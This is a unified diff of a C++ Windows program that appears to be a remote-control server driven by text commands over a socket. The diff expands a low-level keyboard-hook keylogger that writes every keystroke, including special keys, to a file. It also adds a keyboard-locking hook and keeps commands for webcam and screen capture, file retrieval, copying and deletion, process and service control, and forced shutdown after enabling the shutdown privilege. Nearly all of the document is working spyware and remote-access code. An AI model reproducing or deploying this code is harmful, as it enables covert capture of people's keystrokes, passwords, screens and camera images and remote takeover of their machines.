@@ -1,182 +1,229 @@
 #include "utils.h"
 
-VideoCapture* cap = nullptr;
-HHOOK hHook = NULL;
-atomic<bool> keepKeyloggerRunning;
 ofstream fo;
 stringstream inp, out;
-string keyloggerCapturePath = filesystem::current_path().string() + "/keylogger.txt";
+string requestFilePath;
 string webcamCapturePath = filesystem::current_path().string() + "/webcam.png";
 string screenCapturePath = filesystem::current_path().string() + "/screen.png";
-string requestFilePath;
+string keyloggerCapturePath = filesystem::current_path().string() + "/keylogger.txt";
+VideoCapture* cap = nullptr;
+HHOOK hKeyloggerHook = nullptr;
+HHOOK hKeylockerHook = nullptr;
+atomic<bool> keepRunning(false);
+bool isShiftDown = false;
 
-// Return a map of command to corresponding handler
-map<string, map<string, function<void()>>> setupHandlers() {
-    return {
+unordered_map<int, string> specialKeys = {
+    {VK_BACK, "[BACKSPACE]"},
+    {VK_TAB, "[TAB]"},
+    {VK_RETURN, "[ENTER]"},
+    {VK_PAUSE, "[PAUSE]"},
+    {VK_CAPITAL, "[CAPS]"},
+    {VK_ESCAPE, "[ESC]"},
+    {VK_SPACE, "[SPACE]"},
+    {VK_PRIOR, "[PGUP]"},
+    {VK_NEXT, "[PGDN]"},
+    {VK_END, "[END]"},
+    {VK_HOME, "[HOME]"},
+    {VK_LEFT, "[LEFT]"},
+    {VK_UP, "[UP]"},
+    {VK_RIGHT, "[RIGHT]"},
+    {VK_DOWN, "[DOWN]"},
+    {VK_INSERT, "[INS]"},
+    {VK_DELETE, "[DEL]"},
+    {VK_LWIN, "[WIN]"},
+    {VK_RWIN, "[WIN]"},
+    {VK_NUMLOCK, "[NUM]"},
+    {VK_SCROLL, "[SCROLL]"},
+    {VK_APPS, "[MENU]"},
+    {VK_CLEAR, "[CLEAR]"},
+    {VK_DIVIDE, "[NUM/]"},
+    {VK_SNAPSHOT, "[PRINT_SCREEN]"},
+    {VK_VOLUME_MUTE, "[VOLUME_MUTE]"},
+    {VK_VOLUME_DOWN, "[VOLUME_DOWN]"},
+    {VK_VOLUME_UP, "[VOLUME_UP]"},
+    {VK_MEDIA_NEXT_TRACK, "[MEDIA_NEXT]"},
+    {VK_MEDIA_PREV_TRACK, "[MEDIA_PREV]"},
+    {VK_MEDIA_STOP, "[MEDIA_STOP]"},
+    {VK_MEDIA_PLAY_PAUSE, "[MEDIA_PLAY_PAUSE]"},
+    {0xFF, "[Undefined]"}
+};
+
+map<string, map<string, function<void()>>> handlers = {
+    {
+        "list", 
         {
-            "list", 
+            { 
+                "app", listApps 
+            },
+            { 
+                "service", listServices 
+            },
             {
-                { 
-                    "app", listApps 
-                },
-                { 
-                    "service", listServices 
-                },
-                {
-                    "dir",
-                    [] {
-                        string dirPath;
-                        inp.ignore(numeric_limits<streamsize>::max(), '"');
-                        getline(inp, dirPath, '"');
-                        if (dirPath == "") {
-                            throw invalid_argument("Missing argument: dirPath cannot be empty");
-                        }
-                        listDir(dirPath);
+                "dir",
+                [] {
+                    string dirPath;
+                    inp.ignore(numeric_limits<streamsize>::max(), '"');
+                    getline(inp, dirPath, '"');
+                    if (dirPath == "") {
+                        throw invalid_argument("Missing argument: dirPath cannot be empty");
                     }
-                }
-            }
-        },
-        {
-            "start",
-            {
-                {
-                    "app", 
-                    [] {
-                        string appName;
-                        inp >> appName;
-                        if (appName == "") {
-                            throw invalid_argument("Missing argument: appName cannot be empty");
-                        }
-                        startApp(const_cast<wchar_t*>(wstring(appName.begin(), appName.end()).c_str()));
-                    }
-                },
-                {
-                    "service",
-                    [] {
-                        string serviceName;
-                        inp >> serviceName;
-                        if (serviceName == "") {
-                            throw invalid_argument("Missing argument: serviceName cannot be empty");
-                        }
-                        startServiceByName(wstring(serviceName.begin(), serviceName.end()).c_str());
-                    }
-                },
-                {
-                    "camera", startCamera
-                },
-                {
-                    "keylogger", startKeylogger
-                }
-            }
-        },
-        {
-            "stop",
-            {
-                {
-                    "app", 
-                    [] {
-                        unsigned long procID = 0;
-                        inp >> procID;
-                        if (procID == 0) {
-                            throw invalid_argument("Missing argument: procID cannot be empty");
-                        }
-                        stopApp(procID);
-                    }
-                },
-                {
-                    "service",
-                    [] {
-                        string serviceName;
-                        inp >> serviceName;
-                        if (serviceName == "") {
-                            throw invalid_argument("Missing argument: serviceName cannot be empty");
-                        }
-                        stopServiceByName(wstring(serviceName.begin(), serviceName.end()).c_str());
-                    }
-                },
-                {
-                    "camera", stopCamera
-                },
-                {
-                    "keylogger", stopKeylogger
-                }
-            }
-        },
-        {
-            "power",
-            {
-                { "shutdown", shutdownMachine },
-                { "restart", restartMachine }
-            }
-        },
-        {
-            "file",
-            {
-                {
-                    "get",
-                    [] {
-                        inp.ignore(numeric_limits<streamsize>::max(), '"');
-                        getline(inp, requestFilePath, '"');
-                        if (requestFilePath == "") {
-                            throw invalid_argument("Missing argument: filePath cannot be empty");
-                        }
-                        out << "File was get successfully.\n\nSee more in file " << getFileName(requestFilePath);
-                    }
-                },
-                {
-                    "copy",
-                    [] {
-                        string srcPath, desPath;
-                        inp.ignore(numeric_limits<streamsize>::max(), '"');
-                        getline(inp, srcPath, '"');
-                        inp.ignore(numeric_limits<streamsize>::max(), '"');
-                        getline(inp, desPath, '"');
-                        if (srcPath == "" || desPath == "") {
-                            throw invalid_argument("Missing argument: srcPath or desPath cannot be empty");
-                        }
-                        copyFile(wstring(srcPath.begin(), srcPath.end()).c_str(), wstring(desPath.begin(), desPath.end()).c_str());
-                    }
-                },
-                {
-                    "delete",
-                    [] {
-                        string filePath;
-                        inp.ignore(numeric_limits<streamsize>::max(), '"');
-                        getline(inp, filePath, '"');
-                        if (filePath == "") {
-                            throw invalid_argument("Missing argument: filePath cannot be empty");
-                        }
-                        deleteFile(wstring(filePath.begin(), filePath.end()).c_str());
-                    }
-                }
-            }
-        },
-        {
-            "capture", 
-            {
-                { "camera", captureCamera },
-                { "screen", captureScreen }
-            }
-        },
-        {
-            "help",
-            {
-                { "", getInstruction }
-            }
-        },
-        {
-            "exit",
-            {
-                { 
-                    "",
-                    [] {
-                        out << "Server stopped!\n";
-                    }
+                    listDir(dirPath);
                 }
             }
         }
-    };
-}
+    },
+    {
+        "start",
+        {
+            {
+                "app", 
+                [] {
+                    string appName;
+                    inp >> appName;
+                    if (appName == "") {
+                        throw invalid_argument("Missing argument: appName cannot be empty");
+                    }
+                    startApp(const_cast<wchar_t*>(wstring(appName.begin(), appName.end()).c_str()));
+                }
+            },
+            {
+                "service",
+                [] {
+                    string serviceName;
+                    inp >> serviceName;
+                    if (serviceName == "") {
+                        throw invalid_argument("Missing argument: serviceName cannot be empty");
+                    }
+                    startServiceByName(wstring(serviceName.begin(), serviceName.end()).c_str());
+                }
+            },
+            {
+                "camera", startCamera
+            },
+            {
+                "keylogger", startKeylogger
+            }
+        }
+    },
+    {
+        "stop",
+        {
+            {
+                "app", 
+                [] {
+                    unsigned long procID = 0;
+                    inp >> procID;
+                    if (procID == 0) {
+                        throw invalid_argument("Missing argument: procID cannot be empty");
+                    }
+                    stopApp(procID);
+                }
+            },
+            {
+                "service",
+                [] {
+                    string serviceName;
+                    inp >> serviceName;
+                    if (serviceName == "") {
+                        throw invalid_argument("Missing argument: serviceName cannot be empty");
+                    }
+                    stopServiceByName(wstring(serviceName.begin(), serviceName.end()).c_str());
+                }
+            },
+            {
+                "camera", stopCamera
+            },
+            {
+                "keylogger", stopKeylogger
+            }
+        }
+    },
+    {
+        "power",
+        {
+            { "shutdown", shutdownMachine },
+            { "restart", restartMachine }
+        }
+    },
+    {
+        "file",
+        {
+            {
+                "get",
+                [] {
+                    inp.ignore(numeric_limits<streamsize>::max(), '"');
+                    getline(inp, requestFilePath, '"');
+                    if (requestFilePath == "") {
+                        throw invalid_argument("Missing argument: filePath cannot be empty");
+                    }
+                    out << "File was get successfully.\n\nSee more in file " << getFileName(requestFilePath);
+                }
+            },
+            {
+                "copy",
+                [] {
+                    string srcPath, desPath;
+                    inp.ignore(numeric_limits<streamsize>::max(), '"');
+                    getline(inp, srcPath, '"');
+                    inp.ignore(numeric_limits<streamsize>::max(), '"');
+                    getline(inp, desPath, '"');
+                    if (srcPath == "" || desPath == "") {
+                        throw invalid_argument("Missing argument: srcPath or desPath cannot be empty");
+                    }
+                    copyFile(wstring(srcPath.begin(), srcPath.end()).c_str(), wstring(desPath.begin(), desPath.end()).c_str());
+                }
+            },
+            {
+                "delete",
+                [] {
+                    string filePath;
+                    inp.ignore(numeric_limits<streamsize>::max(), '"');
+                    getline(inp, filePath, '"');
+                    if (filePath == "") {
+                        throw invalid_argument("Missing argument: filePath cannot be empty");
+                    }
+                    deleteFile(wstring(filePath.begin(), filePath.end()).c_str());
+                }
+            }
+        }
+    },
+    {
+        "capture", 
+        {
+            { "camera", captureCamera },
+            { "screen", captureScreen }
+        }
+    },
+    {
+        "lock",
+        {
+            { "keyboard", lockKeyboard }
+        }
+    },
+    {
+        "unlock",
+        {
+            { "keyboard", unlockKeyboard }
+        }
+    },
+    {
+        "help",
+        {
+            { "", getInstruction }
+        }
+    },
+    {
+        "exit",
+        {
+            { 
+                "",
+                [] {
+                    out << "Server stopped!\n";
+                }
+            }
+        }
+    }
+};
 
 void getInstruction() {
     out << "Usages:\n\n"
@@ -188,6 +235,7 @@ void getInstruction() {
         << "\tcapture\t[camera|screen]\n"
         << "\tstart\t[camera|keylogger]\n"
         << "\tstop\t[camera|keylogger]\n"
+        << "\t[un]lock\tkeyboard\n"
         << "\thelp\n"
         << "\texit\n";
 }
@@ -369,6 +417,33 @@ void stopServiceByName(LPCWSTR serviceName) {
     out << "Service stopped successfully.\n";
 }
 
+void enableShutdownPrivilege() {
+    HANDLE token;
+    TOKEN_PRIVILEGES tkp;
+
+    // Open a handle to the process's access token
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
+        throw runtime_error("Failed to open process token. Error: " + to_string(GetLastError()));
+    }
+
+    // Look up the LUID for the shutdown privilege
+    if (!LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
+        CloseHandle(token);
+        throw runtime_error("Failed to lookup privilege value. Error: " + to_string(GetLastError()));
+    }
+
+    tkp.PrivilegeCount = 1;  // We are enabling one privilege
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    // Adjust the token's privileges to enable shutdown privilege
+    if (!AdjustTokenPrivileges(token, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
+        CloseHandle(token);
+        throw runtime_error("Failed to adjust token privileges. Error: " + to_string(GetLastError()));
+    }
+
+    CloseHandle(token);
+}
+
 void shutdownMachine() {
     enableShutdownPrivilege();
 
@@ -460,96 +535,175 @@ void captureScreen() {
     out << "Capture screen successfuly.\n\nSee more in file " << screenCapturePath.substr(screenCapturePath.find_last_of("/") + 1);
 }
 
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+LRESULT CALLBACK KeyloggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT* pKBDLLHookStruct = (KBDLLHOOKSTRUCT*)lParam;
-        if (wParam == WM_KEYDOWN) {
-            // Get the virtual key code
-            UINT vkCode = pKBDLLHookStruct->vkCode;
+        DWORD vkCode = pKBDLLHookStruct->vkCode;
 
-            // Prepare buffer for the key name
-            vector<wchar_t> keyName(256);
+        switch (wParam) {
+        case WM_KEYDOWN:
+        case WM_SYSKEYDOWN:
+            // Handle Shift keys
+            if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
+                isShiftDown = true;
+                // Do not log Shift key presses
+            }
+            // Handle Control keys
+            else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
+                fo << "[CTRL DOWN] ";
+            }
+            // Handle Alt keys
+            else if (vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU) {
+                fo << "[ALT DOWN] ";
+            }
+            else {
+                // Handle Function keys
+                if (vkCode >= VK_F1 && vkCode <= VK_F24) {
+                    fo << "[F" << (vkCode - VK_F1 + 1) << "] ";
+                    break;
+                }
 
-            // Print the key name if the result is positive
-            BYTE keyboardState[256];
-            if (GetKeyboardState(keyboardState)) {
-                int result = ToUnicodeEx(vkCode, 0, keyboardState, keyName.data(), static_cast<int>(keyName.size()), 0, GetKeyboardLayout(0));
-                if (result > 0 && 32 <= vkCode && vkCode < 126) {
-                    fo.write((const char*)keyName.data(), result);
-                    fo << " ";
+                // Handle other special keys
+                auto it = specialKeys.find(vkCode);
+                if (it != specialKeys.end()) {
+                    fo << it->second << " ";
+                    break;
+                }
+
+                // Handle regular character keys
+                BYTE keyboardState[256];
+                if (!GetKeyboardState(keyboardState)) {
+                    break;
+                }
+
+                // Modify keyboard state to include SHIFT if it's held down
+                if (isShiftDown) {
+                    keyboardState[VK_SHIFT] |= 0x80;
+                }
+
+                wchar_t unicodeChar[4] = { 0 };
+                UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC_EX, GetKeyboardLayout(0));
+
+                int result = ToUnicodeEx(
+                    vkCode,
+                    scanCode,
+                    keyboardState,
+                    unicodeChar,
+                    sizeof(unicodeChar) / sizeof(wchar_t),
+                    0,
+                    GetKeyboardLayout(0)
+                );
+
+                if (result > 0) {
+                    char utf8Char[4] = { 0 };
+                    WideCharToMultiByte(
+                        CP_UTF8,
+                        0,
+                        unicodeChar,
+                        result,
+                        utf8Char,
+                        sizeof(utf8Char),
+                        NULL,
+                        NULL
+                    );
+                    fo << utf8Char << " ";
                 }
                 else {
+                    // If unable to translate, log the virtual key code
                     fo << vkCode << " ";
                 }
             }
+            break;
+
+        case WM_KEYUP:
+        case WM_SYSKEYUP:
+            // Handle Shift keys
+            if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
+                isShiftDown = false;
+                // Do not log Shift key releases
+            }
+            // Handle Control keys
+            else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
+                fo << "[CTRL UP] ";
+            }
+            // Handle Alt keys
+            else if (vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU) {
+                fo << "[ALT UP] ";
+            }
+            break;
         }
     }
-    return CallNextHookEx(hHook, nCode, wParam, lParam);
-}
-
-void KeyloggerThread() {
-    // Set the hook for the keyboard
-    hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
-    
-    // Message loop to keep the hook alive
-    MSG msg;
-    while (keepKeyloggerRunning) {
-        // Check for messages with a timeout
-        if (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
-            TranslateMessage(&msg);
-            DispatchMessageW(&msg);
-        }
-        else {
-            // Sleep to avoid busy waiting
-            this_thread::sleep_for(chrono::milliseconds(10));
-        }
-    }
-
-    // Unhook when done
-    UnhookWindowsHookEx(hHook);
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
 void startKeylogger() {
-    fo.open(keyloggerCapturePath);
-    if (!fo.is_open()) {
-        throw runtime_error("Failed to start keylogger");
-    }
+    if (!hKeyloggerHook) {
+        fo.open(keyloggerCapturePath);
+        if (!fo.is_open()) {
+            throw runtime_error("Failed to start keylogger");
+        }
     
-    keepKeyloggerRunning = true;
-    thread keyloggerThread(KeyloggerThread);
-    keyloggerThread.detach(); // Detach the thread to run independently
-    out << "Keylogger started successfully.\n";
+        keepRunning = true;
+        thread keyloggerThread([]() {
+            hKeyloggerHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyloggerProc, nullptr, 0);
+
+            MSG msg;
+            while (keepRunning) {
+                if (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
+                    TranslateMessage(&msg);
+                    DispatchMessageW(&msg);
+                }
+                else {
+                    this_thread::sleep_for(chrono::milliseconds(10));
+                }
+            }
+
+            UnhookWindowsHookEx(hKeyloggerHook);
+            hKeyloggerHook = nullptr;
+        });
+        keyloggerThread.detach(); // Detach the thread to run independently
+        out << "Keylogger started successfully.\n";
+    }
+    else {
+        out << "Keylogger already started.\n";
+    }
 }
 
 void stopKeylogger() {
-    if (!fo.is_open()) {
-        throw runtime_error("Error: Keylogger is not start");
+    if (hKeyloggerHook) {
+        // Post a message to wake up the message loop
+        keepRunning = false;
+        PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0);
+        out << "Keylogger stopped successfully.\n\nSee more in file " << getFileName(keyloggerCapturePath);
+    
+        fo.close();
     }
-    
-    keepKeyloggerRunning = false;
-    // Post a message to wake up the message loop
-    PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0);
-    out << "Keylogger stopped successfully.\n\nSee more in file " << getFileName(keyloggerCapturePath);
-    
-    fo.close();
+    else {
+        out << "Keylogger already stopped.\n";
+    }
 }
 
 void startCamera() {
-    cap = new VideoCapture(0);
-    cap->set(cv::CAP_PROP_FRAME_WIDTH, 1280);
-    cap->set(cv::CAP_PROP_FRAME_HEIGHT, 720);
+    if (!cap) {
+        cap = new VideoCapture(0);
+        cap->set(cv::CAP_PROP_FRAME_WIDTH, 1280);
+        cap->set(cv::CAP_PROP_FRAME_HEIGHT, 720);
     
-    if (!cap || !cap->isOpened()) {
-        throw runtime_error("Failed to open webcam");
-    }
+        if (!cap || !cap->isOpened()) {
+            throw runtime_error("Failed to open webcam");
+        }
     
-    Mat frame;
-    *cap >> frame;
-    if (!imwrite(webcamCapturePath, frame)) {
-        throw runtime_error("Failed to save the capture image");
-    }
+        Mat frame;
+        *cap >> frame;
+        if (!imwrite(webcamCapturePath, frame)) {
+            throw runtime_error("Failed to save the capture image");
+        }
 
-    out << "Webcam opened successfully.\n\nSee more in file " << getFileName(webcamCapturePath);
+        out << "Webcam opened successfully.\n\nSee more in file " << getFileName(webcamCapturePath);
+    }
+    else {
+        out << "Webcam already started.\n";
+    }
 }
 
 void captureCamera() {
@@ -577,7 +731,9 @@ void stopCamera() {
     }
         
     cap->release();
-    destroyAllWindows();
+    delete cap;
+    cap = nullptr;
+    
     out << "Webcam closed successfully.\n\nSee more in file " << getFileName(webcamCapturePath);
 }
 
@@ -599,29 +755,54 @@ void sendFile(CSocket& socket, const string& filePath) {
     file.Close();
 }
 
-void enableShutdownPrivilege() {
-    HANDLE token;
-    TOKEN_PRIVILEGES tkp;
-
-    // Open a handle to the process's access token
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
-        throw runtime_error("Failed to open process token. Error: " + to_string(GetLastError()));
+LRESULT CALLBACK KeylockerProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0) {
+        return 1; // Block keyboard input
     }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
 
-    // Look up the LUID for the shutdown privilege
-    if (!LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
-        CloseHandle(token);
-        throw runtime_error("Failed to lookup privilege value. Error: " + to_string(GetLastError()));
+void lockKeyboard() {
+    if (!hKeylockerHook) {
+        hKeylockerHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeylockerProc, nullptr, 0);
+        if (!hKeylockerHook) {
+            throw runtime_error("Failed to lock keyboard. Error: " + to_string(GetLastError()));
+        }
+
+        keepRunning = true;
+        thread keylockerThread([]() {
+            hKeylockerHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeylockerProc, nullptr, 0);
+
+            MSG msg;
+            while (keepRunning) {
+                if (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
+                    TranslateMessage(&msg);
+                    DispatchMessageW(&msg);
+                }
+                else {
+                    this_thread::sleep_for(chrono::milliseconds(10));
+                }
+            }
+
+            UnhookWindowsHookEx(hKeylockerHook);
+            hKeylockerHook = nullptr;
+        });
+        keylockerThread.detach(); // Detach the thread to run independently
+        out << "Keyboard locked successfully.\n";
     }
-
-    tkp.PrivilegeCount = 1;  // We are enabling one privilege
-    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-    // Adjust the token's privileges to enable shutdown privilege
-    if (!AdjustTokenPrivileges(token, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
-        CloseHandle(token);
-        throw runtime_error("Failed to adjust token privileges. Error: " + to_string(GetLastError()));
+    else {
+        out << "Keyboard already locked.\n";
     }
+}
 
-    CloseHandle(token);
+void unlockKeyboard() {
+    if (hKeylockerHook) {
+        // Post a message to wake up the message loop
+        keepRunning = false;
+        PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0);
+        out << "Keyboard unlocked successfully.\n";
+    }
+    else {
+        out << "Keyboard already unlocked.\n";
+    }
 }
